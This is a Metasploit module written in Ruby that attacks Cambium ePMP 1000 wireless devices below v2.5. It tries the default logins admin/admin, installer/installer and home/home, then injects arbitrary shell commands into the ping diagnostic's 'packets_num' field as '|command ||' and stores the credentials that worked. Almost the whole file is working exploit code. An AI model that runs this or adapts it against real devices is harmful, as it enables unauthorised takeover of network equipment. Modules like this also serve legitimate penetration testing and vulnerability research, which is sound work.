##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Module::Deprecated

  deprecated(Date.new(2018, 2, 24), 'auxiliary/scanner/http/epmp1000_ping_cmd_exec')

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Cambium ePMP 1000 (up to v2.5) Arbitrary Command Execution',
      'Description' => %{
          This module exploits an OS Command Injection vulnerability in Cambium ePMP 1000 (<v2.5) device management portal. It requires any one of the following login credentials - admin/admin, installer/installer, home/home - to execute arbitrary system commands.
      },
      'References' =>
        [
          ['URL', 'http://ipositivesecurity.com/2015/11/28/cambium-epmp-1000-multiple-vulnerabilities/'],
          ['URL', 'https://support.cambiumnetworks.com/file/476262a0256fdd8be0e595e51f5112e0f9700f83']
        ],
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'License' => MSF_LICENSE
     )
    )

    register_options(
      [
        Opt::RPORT(80),	# Application may run on a different port too. Change port accordingly.
        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'installer']),
        OptString.new('PASSWORD', [true, 'A specific password to authenticate with', 'installer']),
        OptString.new('CMD', [true, 'Command(s) to run', 'id; pwd'])
      ], self.class
    )
  end

  def run_host(ip)
    unless is_app_epmp1000?
      return
    end

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Check if App is Cambium ePMP 1000
  #

  def is_app_epmp1000?
    begin
      res = send_request_cgi(
        {
          'uri'       => '/',
          'method'    => 'GET'
        }
      )

    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return false
    end

    good_response = (
      res &&
      res.code == 200 &&
      res.headers['Server'] &&
      (res.headers['Server'].include?('Cambium HTTP Server') || res.body.include?('cambiumnetworks.com'))
    )

    if good_response
      get_epmp_ver = res.body.match(/"sw_version">([^<]*)/)
      if !get_epmp_ver.nil?
        epmp_ver = get_epmp_ver[1]
        if !epmp_ver.nil?
          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000 version #{epmp_ver}...")
          if "#{epmp_ver}" >= '2.5'
            print_error('This ePMP version is not vulnerable. Module will not continue.')
            return false
          else
            return true
          end
        else
          print_good("#{rhost}:#{rport} - Running Cambium ePMP 1000...")
          return true
        end
      end
    else
      print_error("#{rhost}:#{rport} - Application does not appear to be Cambium ePMP 1000. Module will not continue.")
      return false
    end
  end

  #
  # Execute arbitrary command(s)
  #

  def do_login(user, pass)
    print_status("#{rhost}:#{rport} - Attempting to login...")
    begin
      res = send_request_cgi(
        {
          'uri' => '/cgi-bin/luci',
          'method' => 'POST',
          'headers' => {
            'X-Requested-With' => 'XMLHttpRequest',
            'Accept' => 'application/json, text/javascript, */*; q=0.01'
          },
          'vars_post' =>
            {
              'username' => 'dashboard',
              'password' => ''
            }
        }
      )

      good_response = (
        res &&
        res.code == 200
      )

      if good_response
        sysauth_value = res.get_cookies_parsed.scan(/((.*)[$ ])/).flatten[0] || ''

        cookie1 = "#{sysauth_value}; " + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D"

        res = send_request_cgi(
          {
            'uri' => '/cgi-bin/luci',
            'method' => 'POST',
            'cookie' => cookie1,
            'headers' => {
              'X-Requested-With' => 'XMLHttpRequest',
              'Accept' => 'application/json, text/javascript, */*; q=0.01',
              'Connection' => 'close'
            },
            'vars_post' =>
              {
                'username' => user,
                'password' => pass
              }
          }
        )

      end

      good_response = (
        res &&
        res.code == 200 &&
        res.get_cookies_parsed.scan(/(stok=(.*))/).flatten[0]
      )

      if good_response
        print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")

        report_cred(
          ip: rhost,
          port: rport,
          service_name: 'Cambium ePMP 1000',
          user: user,
          password: pass
        )

        get_stok = res.get_cookies.scan(/(stok=(.*))/) || ''
        if !get_stok.nil?
          stok_value = get_stok[1]
          sysauth_value = res.get_cookies.scan(/((.*)[$ ])/).flatten[0] || ''

          cookie2 = "#{sysauth_value}; " + "globalParams=%7B%22dashboard%22%3A%7B%22refresh_rate%22%3A%225%22%7D%2C%22#{user}%22%3A%7B%22refresh_rate%22%3A%225%22%7D%7D; userType=Installer; usernameType=installer; stok=" + "#{stok_value}"

          uri1 = '/cgi-bin/luci/;stok=' + "#{stok_value}" + '/admin/ping'
          command = datastore['CMD']
          inject = '|' + "#{command}" + ' ||'
          clean_inject = CGI.unescapeHTML(inject.to_s)

          print_status("#{rhost}:#{rport} - Executing #{command}")

          res = send_request_cgi(
            {
              'uri' => uri1,
              'method' => 'POST',
              'cookie' => cookie2,
              'headers' => {
                'Accept' => '*/*',
                'Accept-Language' => 'en-US,en;q=0.5',
                'Accept-Encoding' => 'gzip, deflate',
                'X-Requested-With' => 'XMLHttpRequest',
                'ctype' => '*/*',
                'Connection' => 'close'
              },
              'vars_post' =>
                {
                  'ping_ip' => '8.8.8.8',
                  'packets_num' => clean_inject,
                  'buf_size' => 0,
                  'ttl' => 1,
                  'debug' => '0'
                }
            }
          )

          # Extract ePMP version
          res = send_request_cgi(
            {
              'uri' => '/',
              'method' => 'GET'
            }
          )

          epmp_ver = res.body.match(/"sw_version">([^<]*)/)[1]

          report_cred(
            ip: rhost,
            port: rport,
            service_name: "Cambium ePMP 1000 v#{epmp_ver}",
            user: user,
            password: pass
          )
        else
          # Login failed
          print_error("FAILED LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
        end
      end
    end
  end
end
